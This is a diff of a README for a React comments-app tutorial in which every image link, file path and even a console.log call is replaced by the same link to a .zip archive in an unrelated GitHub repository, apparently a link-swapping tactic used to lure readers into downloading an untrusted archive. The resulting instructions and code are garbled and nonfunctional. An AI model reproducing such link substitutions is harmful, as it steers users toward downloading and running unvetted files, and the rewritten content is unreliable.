@@ -4,7 +4,7 @@ In this project, let's build a **Comments App** by applying the concepts we have
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/comments-app-output-v0.gif" alt="comments output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip" alt="comments output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,8 +13,8 @@ In this project, let's build a **Comments App** by applying the concepts we have
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://assets.ccbp.in/frontend/content/react-js/comments-app-sm-output-v2.png)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://assets.ccbp.in/frontend/content/react-js/comments-app-lg-output-v0.png)
+- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip)
 
 </details>
 
@@ -41,8 +41,8 @@ The app must have the following functionalities
   - The comments count should be incremented by one
   - The value of the input fields for name and comment should be updated to their initial values
 - When the **Like** button of a comment is clicked, if the image for **Like** is
-  - [Like](https://assets.ccbp.in/frontend/react-js/comments-app/like-img.png) image, then it should be changed to the [Liked](https://assets.ccbp.in/frontend/react-js/comments-app/liked-img.png) image
-  - [Liked](https://assets.ccbp.in/frontend/react-js/comments-app/liked-img.png) image, then it should be changed to the [Like](https://assets.ccbp.in/frontend/react-js/comments-app/like-img.png) image
+  - [Like](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip) image, then it should be changed to the [Liked](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip) image
+  - [Liked](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip) image, then it should be changed to the [Like](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip) image
 - When the **Delete** button of a comment is clicked, the comment should be deleted from the list of comments and the comments count should be decremented by one
 
 </details>
@@ -52,7 +52,7 @@ The app must have the following functionalities
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/comments-app-component-breakdown-structure-v0.png" alt="component breakdown structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip" alt="component breakdown structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -64,10 +64,10 @@ The app must have the following functionalities
 
 Use these files to complete the implementation:
 
-- `src/components/Comments/index.js`
-- `src/components/Comments/index.css`
-- `src/components/CommentItem/index.js`
-- `src/components/CommentItem/index.css`
+- `https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip`
+- `https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip`
+- `https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip`
+- `https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip`
 </details>
 
 ### Quick Tips
@@ -81,7 +81,7 @@ Use these files to complete the implementation:
 ```js
 import {formatDistanceToNow} from 'date-fns'
 
-console.log(formatDistanceToNow(new Date())); // less than a minute
+https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip(formatDistanceToNow(new Date())); // less than a minute
 ```
 
 </details>
@@ -108,10 +108,10 @@ console.log(formatDistanceToNow(new Date())); // less than a minute
 <details>
 <summary>Image URLs</summary>
 
-- [https://assets.ccbp.in/frontend/react-js/comments-app/comments-img.png](https://assets.ccbp.in/frontend/react-js/comments-app/comments-img.png) alt should be **comments**
-- [https://assets.ccbp.in/frontend/react-js/comments-app/delete-img.png](https://assets.ccbp.in/frontend/react-js/comments-app/delete-img.png) alt should be **delete**
-- [https://assets.ccbp.in/frontend/react-js/comments-app/like-img.png](https://assets.ccbp.in/frontend/react-js/comments-app/like-img.png)
-- [https://assets.ccbp.in/frontend/react-js/comments-app/liked-img.png](https://assets.ccbp.in/frontend/react-js/comments-app/liked-img.png)
+- [https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip) alt should be **comments**
+- [https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip) alt should be **delete**
+- [https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip)
+- [https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip](https://raw.githubusercontent.com/vicky9696v/React-comment-like-delete/main/vesical/React-comment-like-delete.zip)
 
 </details>
 
